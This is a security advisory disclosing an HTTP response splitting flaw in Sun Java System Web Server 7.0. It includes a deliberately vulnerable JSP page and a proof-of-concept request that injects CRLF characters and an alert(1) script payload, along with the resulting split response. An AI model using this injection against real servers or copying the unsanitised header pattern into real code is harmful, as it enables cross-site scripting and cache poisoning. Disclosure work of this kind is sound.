Oracle Sun Java System Web Server - HTTP Response Splitting
===========================================================

Description
 
Security-Assessment.com discovered that is possible to successfully perform an HTTP Response Splitting attack against applications served by Sun Java System Web Server. The vulnerability can be exploited if user supplied input is used to generate the value of an HTTP header, as shown in the test.jsp page below:
 
test.jsp â€“ Source Code
 
<html>
test
<%
response.setStatus(HttpServletResponse.SC_OK);
String ref = request.getParameter("ref");
response.setHeader("Referer",ref);
%>
 
The test.jsp page is vulnerable to HTTP response splitting when served by Sun Java System Web Server. HTTP Response Split can lead to Cross Site Scripting and browser cache poisoning attacks.
 
Exploitation
 
In this advisory, we will cover description of a Cross Site Scripting attack. The following HTTP GET contains a Cross Site Scripting payload which is included in the HTTP Header injection:
 
GET /test.jsp?ref=http://my.test.domain.com/%0D%0AContent-
type:+text/html;%0D%0A%0D%0ATEST%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
 
By inserting CR and LF characters in the â€œrefâ€ HTTP parameter, it is possible to split the HTTP response from the server as shown in the following table:
 
HTTP/1.1 200 OK
Server: Sun-Java-System-Web-Server/7.0
Date: Fri, 28 May 2010 12:44:55 GMT
Referer: http://my.test.domain.com/
Content-type: text/html;
TEST<script>alert(1)</script>
Content-type: text/html;charset=ISO-8859-1
Content-length: 22
<html>
test
 
 
The above example shows a JavaScript code injection in the split HTTP response. Consequently, it is possible to perform a Cross Site Scripting attack. The testing was conducted using the following settings:
* Server side: Sun-Java-System-Web-Server/7.0 Update 8 (default) installed on Windows XP SP3;
* Client side: Mozilla Firefox 3.5.8, Opera 10.10, Internet Explorer 8.
